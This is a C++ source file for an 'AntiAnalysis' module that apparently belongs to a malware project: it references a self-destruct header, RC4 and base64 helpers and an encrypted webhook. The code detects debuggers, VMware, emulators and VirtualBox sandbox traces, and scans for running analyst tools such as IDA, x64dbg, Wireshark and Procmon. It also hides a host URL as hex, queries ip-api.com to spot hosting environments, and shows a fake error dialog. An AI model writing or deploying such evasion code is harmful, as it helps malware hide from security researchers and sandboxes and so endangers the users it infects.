#include "AntiAnalysis.h"
#include "SelfDestruct.h"
#include <intrin.h>
#include <chrono>
#include <thread>
#include <algorithm>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <comdef.h>
#include <Wbemidl.h>
#include "Config.h"
#include <random>
#include <Windows.h>
#include <winhttp.h>
#include <codecvt>
#include <iostream>
#include <tlhelp32.h>
#include "rc4.h"
#include "base64.h"

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "winhttp.lib")

// Function to detect debugger presence using exception handling
bool AntiAnalysis::IsDebuggerPresentByException()
{
    // Check if the current process is being debugged
    if (::IsDebuggerPresent()) {
        return true;
    }

    // Check if a remote debugger is attached to the current process
    BOOL debuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent) && debuggerPresent) {
        return true;
    }

    return false;
}

// Function to check CPU ID for features that could indicate the presence of a debugger
bool AntiAnalysis::CheckCPUID()
{
    int cpuInfo[4] = { 0 }; // Array to store CPU information
    __cpuid(cpuInfo, 1); // Call to __cpuid to get processor information for index 1

    bool cc = (cpuInfo[2] >> 31) & 1;
    std::cout << "Debugger detected" << cc << std::endl;

    // Check if the 31st bit of the 2nd element of cpuInfo is set, indicating possible debugger presence
    return (cpuInfo[2] >> 31) & 1;
}

// Function to check if VMware tools are running, which may indicate the use of a virtual machine (VM)
bool AntiAnalysis::IsVmwareRunning()
{
    // Define the VMware Tools service name as a compile-time constant for efficient access
    constexpr const TCHAR* pszServiceName = TEXT("VMTools");

    // Open a handle to the Service Control Manager (SCM) with minimal access rights
    // SC_MANAGER_CONNECT allows querying the service status without needing broader access.
    SC_HANDLE hSCM = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);

    // If opening SCM fails (e.g., due to insufficient permissions or SCM not running),
    // we assume VMware Tools is not running and return false immediately.
    if (hSCM == nullptr)
        return false;

    // Initialize the result to false, assuming the VMware Tools service is not running
    bool bRet = false;

    // Open a handle to the VMware Tools service with SERVICE_QUERY_STATUS access rights,
    // which are sufficient for retrieving its current status.
    SC_HANDLE hService = OpenService(hSCM, pszServiceName, SERVICE_QUERY_STATUS);

    // If OpenService succeeds, the VMware Tools service is installed on the system
    // (whether or not it’s running).
    if (hService != nullptr)
    {
        // Define a structure to store the current status of the service.
        SERVICE_STATUS serviceStatus;

        // Query the status of the VMware Tools service and check if the query succeeded.
        if (QueryServiceStatus(hService, &serviceStatus))
        {
            // Check if the service status indicates it is actively running.
            // SERVICE_RUNNING means the service is fully operational.
            bRet = (serviceStatus.dwCurrentState == SERVICE_RUNNING);
        }

        // Close the handle to the VMware Tools service to free up system resources
        // and avoid potential handle leaks.
        CloseServiceHandle(hService);
    }

    // Close the Service Control Manager handle, ensuring that we properly release resources.
    // This also avoids potential handle leaks within the Service Control Manager.
    CloseServiceHandle(hSCM);

    // Return the result, which will be true if VMware Tools was found running,
    // or false if it was either not running or not present on the system.
    return bRet;
}

// Function to detect if the program is running in an emulator
bool AntiAnalysis::Emulator() {
    try {
        // Capture the current system time in high-resolution ticks before sleep
        auto start = std::chrono::high_resolution_clock::now();

        // Sleep for a very short period (10 milliseconds) to test timing accuracy
        std::this_thread::sleep_for(std::chrono::milliseconds(10));

        // Capture the system time in high-resolution ticks after sleep
        auto end = std::chrono::high_resolution_clock::now();

        // Calculate the time difference in microseconds
        auto elapsed = std::chrono::duration_cast<std::chrono::microseconds>(end - start).count();

        // Check if the elapsed time is significantly shorter than expected
        // Emulators often do not handle sleep accurately and may return quickly
        if (elapsed < 10000) { // Expected ~10,000 microseconds for 10 milliseconds
            return true; // Emulator detected
        }
    }
    catch (...) {
        // Suppress any exceptions that might occur (e.g., clock issues in unusual environments)
    }

    // Return false if timing behavior seems normal, indicating no emulator detected
    return false;
}

bool AntiAnalysis::Processes() {
    // Define an array of process names to check for
    const wchar_t* processes[] = {
        L"Procmon.exe", L"depends.exe", L"ida64.exe", L"ida.exe", L"peid.exe", L"strings.exe", L"reshacker.exe", L"analyzer.exe",
        L"cuckoo.py", L"fakenet-ng.exe", L"regshot.exe", L"ghidraRun.bat", L"ollydbg.exe", L"x64dbg.exe", L"x32dbg.exe", 
        L"sysmon.exe", L"autoruns.exe", L"VirusTotalUploader.exe", L"sandboxie.exe", L"hiew.exe",L"processhacker.exe", 
        L"netstat.exe", L"netmon.exe", L"tcpview.exe", L"wireshark.exe", L"filemon.exe", L"regmon.exe", L"cain.exe", 
        L"SystemInformer.exe"
    };

    // Take a snapshot of all processes in the system
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    // Check if the snapshot handle is valid
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false; // If not, return false indicating failure
    }


    // Initialize a PROCESSENTRY32W structure to store process information
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    // Retrieve information about the first process in the snapshot
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            // Iterate through the list of processes to check if any match the specified names
            for (const auto& process : processes) {
                // Compare the current process name with the specified names (case-insensitive)
                if (_wcsicmp(pe.szExeFile, process) == 0) {
                    CloseHandle(hSnapshot); // Close the snapshot handle
                    return true; // Return true if a match is found
                }
            }

        } while (Process32NextW(hSnapshot, &pe)); // Continue to the next process in the snapshot
    }
    // Close the snapshot handle if no matching process is found
    CloseHandle(hSnapshot);
    return false; // Return false if no matching process is found
}

// Function to check if any sandbox-related DLLs are loaded, indicating a possible sandbox environment
bool AntiAnalysis::SandBox()
{
    // Check for known sandbox processes
    const wchar_t* sandboxProcesses[] = {
        L"vmsrvc.exe", L"vmusrvc.exe", L"vboxservice.exe", L"vboxtray.exe",
        L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe", L"vboxservice.exe"
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            for (const auto& process : sandboxProcesses) {
                if (_wcsicmp(pe.szExeFile, process) == 0) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    // Check for known sandbox registry keys
    HKEY hKey;
    const char* registryKeys[] = {
        "HARDWARE\\ACPI\\DSDT\\VBOX__",
        "HARDWARE\\ACPI\\FADT\\VBOX__",
        "HARDWARE\\ACPI\\RSDT\\VBOX__",
        "SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        "SYSTEM\\ControlSet001\\Services\\VBoxService",
        "SYSTEM\\ControlSet001\\Services\\VBoxSF",
        "SYSTEM\\ControlSet001\\Services\\VBoxVideo"
    };

    for (const auto& key : registryKeys) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }

    return false;
}

// Main function that performs anti-analysis checks
bool AntiAnalysis::Run()
{
    bool detected = false;
    
    // Perform various anti-analysis checks (e.g., detecting virtual environments, sandboxes, etc.)
    if (AntiAnalysis::Processes() || AntiAnalysis::IsDebuggerPresentByException() || AntiAnalysis::SandBox())
    {
        detected = true; 
        return detected;
    }

    return detected;
}

// Global random number generator and distribution to generate random strings
std::default_random_engine generator;
std::uniform_int_distribution<int> distribution(0, 25);

// Function to generate a random string of specified length
std::string GenerateRandomString(int length)
{
    std::string result(length, ' ');  // Create a string of the specified length initialized with spaces
    for (int i = 0; i < length; i++) {
        // Generate a random lowercase letter and assign it to the string
        result[i] = 'a' + distribution(generator);
    }
    return result;  // Return the randomly generated string
}

// Function to simulate a fake error message for anti-debugging purposes
void AntiAnalysis::FakeErrorMessage()
{
    // Generate a random 5-character hexadecimal error code
    std::string code = GenerateRandomString(5);
    code = "0x" + code.substr(0, 5);  // Prefix with "0x" to make it look like an error code

    // Generate a fake error message
    std::string message = "Error " + code + ": Unknown error occurred.";

    // Display the fake error message in a message box with Retry and Cancel options
    int result = MessageBox(NULL, code.c_str(),
        message.c_str(), MB_RETRYCANCEL | MB_ICONERROR);

    // Handle user response from the message box
    if (result == IDRETRY) {
        return;
    }
    else if (result == IDCANCEL) {
        return;
    }

    return;  // Exit the function
}

// Function to convert a hexadecimal string to its ASCII representation
std::string AntiAnalysis::HexToString(const std::string& input)
{
    size_t len = input.length();  // Get the length of the input hexadecimal string

    // Ensure the length of the string is even, as each pair of hex characters represents one byte
    if (len % 2 != 0) {
        throw std::invalid_argument("Input string must have an even number of characters");
    }

    std::string output;  // String to store the result
    output.reserve(len / 2);  // Reserve space for half the length of the input string (each pair of hex characters becomes 1 byte)

    // Loop through the input string, converting each pair of hex characters into a byte
    for (size_t i = 0; i < len; i += 2) {
        // Convert the current pair of hex characters into a byte and add it to the output string
        char c = static_cast<char>(std::stoi(input.substr(i, 2), nullptr, 16));
        output.push_back(c);
    }
    return output;  // Return the converted ASCII string
}

// Static string representing a host URL in hexadecimal form
std::string AntiAnalysis::strHosturl = "574A32A1E075A4AFFBC26898A9D1B39A1A333A38F476F45639AB6F479CA0DB95B3291E3AB2E03AB41EE96AD9B29BF0F9";

// Convert the hexadecimal string into a normal string and store it in the static variable `str`
std::string AntiAnalysis::str = AntiAnalysis::HexToString(AntiAnalysis::strHosturl);

// Function that checks if the current environment is a hosting environment asynchronously

bool AntiAnalysis::HostingAsync()
{
    //std::string Webhook_b64decode = base64_decode(Config::Webhook);
    //const unsigned char* Webhook_str_To_char = reinterpret_cast<const unsigned char*>(Webhook_b64decode.c_str());
    //std::string strurl = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)Webhook_str_To_char, Webhook_b64decode.length());

    // Decrypt the URL string (str) to obtain the actual URL
    std::string strurl = str;

    // Convert the decrypted string from UTF-8 to wide characters (std::wstring)
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, strurl.c_str(), (int)strurl.size(), nullptr, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, strurl.c_str(), (int)strurl.size(), &wstr[0], size_needed);

    // Create the substring that we will append to the URL for querying the hosting information
    std::wstring subStr = std::wstring(L"/line/") + wstr.substr(wstr.find(L"?fields=hosting"));

    // Open an HTTP session with WinHTTP (using the default proxy settings)
    HINTERNET hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
    {
        return false;  // Return false if session creation fails
    }

    // Connect to the IP-API service (which provides information about the IP address)
    HINTERNET hConnect = WinHttpConnect(hSession, L"ip-api.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect)
    {
        // Close the session handle and return false if connection fails
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Prepare the HTTP request using the GET method and the substring (subStr) for the path
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", subStr.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest)
    {
        // If the request object creation fails, clean up handles and return false
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Send the request to the server without any additional headers or data
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
    {
        // Close handles and return false if sending the request fails
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Wait and receive the response from the server
    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        // Close handles and return false if receiving the response fails
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Declare a variable to store the HTTP status code returned by the server
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);

    // Query the status code from the response headers
    if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSize, NULL))
    {
        // Close handles and return false if querying the status code fails
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // If the status code is HTTP 200 OK, continue processing the response
    if (dwStatusCode == HTTP_STATUS_OK)
    {
        DWORD dwContentLength = 0;
        dwSize = sizeof(dwContentLength);

        // Query the content length from the response headers
        if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentLength, &dwSize, NULL))
        {
            // Close handles and return false if querying the content length fails
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Allocate memory for the response data (buffer)
        LPSTR lpBuffer = new CHAR[dwContentLength + 1];
        ZeroMemory(lpBuffer, dwContentLength + 1);  // Zero out the buffer

        DWORD dwBytesRead = 0;

        // Read the response data into the buffer
        if (!WinHttpReadData(hRequest, lpBuffer, dwContentLength, &dwBytesRead))
        {
            // If reading data fails, clean up and return false
            delete[] lpBuffer;
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Look for the word "true" in the response data (e.g., in JSON or text)
        size_t found = std::string(lpBuffer).find("true");
        if (found != std::string::npos) {
            // If "true" is found, return true indicating hosting environment detected
            delete[] lpBuffer;
            return true;
        }
        else {
            // If "true" is not found, return false indicating no hosting environment detected
            delete[] lpBuffer;
            return false;
        }
    }
    else
    {
        // If the HTTP status is not OK, clean up and return false
    }

    // Clean up the handles and resources before returning false
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return false;  // Return false if the hosting environment check fails
}


//bool AntiAnalysis::HostingAsync()
//{
//    // Decrypt the URL string (str) to obtain the actual URL
//    std::string strurl = StringsCrypt::Decrypt(str);
//
//    // Convert the decrypted string from UTF-8 to wide characters (std::wstring)
//    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
//    std::wstring wstr = converter.from_bytes(strurl);
//
//    // Create the substring that we will append to the URL for querying the hosting information
//    std::wstring subStr = std::wstring(L"/line/") + wstr.substr(wstr.find(L"?fields=hosting"));
//
//    // Open an HTTP session with WinHTTP (using the default proxy settings)
//    HINTERNET hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
//    if (!hSession)
//    {
//        return false;  // Return false if session creation fails
//    }
//
//    // Connect to the IP-API service (which provides information about the IP address)
//    HINTERNET hConnect = WinHttpConnect(hSession, L"ip-api.com", INTERNET_DEFAULT_HTTP_PORT, 0);
//    if (!hConnect)
//    {
//        // Close the session handle and return false if connection fails
//        WinHttpCloseHandle(hSession);
//        return false;
//    }
//
//    // Prepare the HTTP request using the GET method and the substring (subStr) for the path
//    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", subStr.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
//    if (!hRequest)
//    {
//        // If the request object creation fails, clean up handles and return false
//        WinHttpCloseHandle(hConnect);
//        WinHttpCloseHandle(hSession);
//        return false;
//    }
//
//    // Send the request to the server without any additional headers or data
//    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
//    {
//        // Close handles and return false if sending the request fails
//        WinHttpCloseHandle(hRequest);
//        WinHttpCloseHandle(hConnect);
//        WinHttpCloseHandle(hSession);
//        return false;
//    }
//
//    // Wait and receive the response from the server
//    if (!WinHttpReceiveResponse(hRequest, NULL))
//    {
//        // Close handles and return false if receiving the response fails
//        WinHttpCloseHandle(hRequest);
//        WinHttpCloseHandle(hConnect);
//        WinHttpCloseHandle(hSession);
//        return false;
//    }
//
//    // Declare a variable to store the HTTP status code returned by the server
//    DWORD dwStatusCode = 0;
//    DWORD dwSize = sizeof(dwStatusCode);
//
//    // Query the status code from the response headers
//    if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSize, NULL))
//    {
//        // Close handles and return false if querying the status code fails
//        WinHttpCloseHandle(hRequest);
//        WinHttpCloseHandle(hConnect);
//        WinHttpCloseHandle(hSession);
//        return false;
//    }
//
//    // If the status code is HTTP 200 OK, continue processing the response
//    if (dwStatusCode == HTTP_STATUS_OK)
//    {
//        DWORD dwContentLength = 0;
//        dwSize = sizeof(dwContentLength);
//
//        // Query the content length from the response headers
//        if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentLength, &dwSize, NULL))
//        {
//            // Close handles and return false if querying the content length fails
//            WinHttpCloseHandle(hRequest);
//            WinHttpCloseHandle(hConnect);
//            WinHttpCloseHandle(hSession);
//            return 0;
//        }
//
//        // Allocate memory for the response data (buffer)
//        LPSTR lpBuffer = new CHAR[dwContentLength + 1];
//        ZeroMemory(lpBuffer, dwContentLength + 1);  // Zero out the buffer
//
//        DWORD dwBytesRead = 0;
//
//        // Read the response data into the buffer
//        if (!WinHttpReadData(hRequest, lpBuffer, dwContentLength, &dwBytesRead))
//        {
//            // If reading data fails, clean up and return false
//            delete[] lpBuffer;
//            WinHttpCloseHandle(hRequest);
//            WinHttpCloseHandle(hConnect);
//            WinHttpCloseHandle(hSession);
//            return 0;
//        }
//
//        // Look for the word "true" in the response data (e.g., in JSON or text)
//        size_t found = std::string(lpBuffer).find("true");
//        if (found != std::string::npos) {
//            // If "true" is found, return true indicating hosting environment detected
//            delete[] lpBuffer;
//            return true;
//        }
//        else {
//            // If "true" is not found, return false indicating no hosting environment detected
//            delete[] lpBuffer;
//            return false;
//        }
//    }
//    else
//    {
//        // If the HTTP status is not OK, clean up and return false
//    }
//
//    // Clean up the handles and resources before returning false
//    WinHttpCloseHandle(hRequest);
//    WinHttpCloseHandle(hConnect);
//    WinHttpCloseHandle(hSession);
//
//    return false;  // Return false if the hosting environment check fails
//}
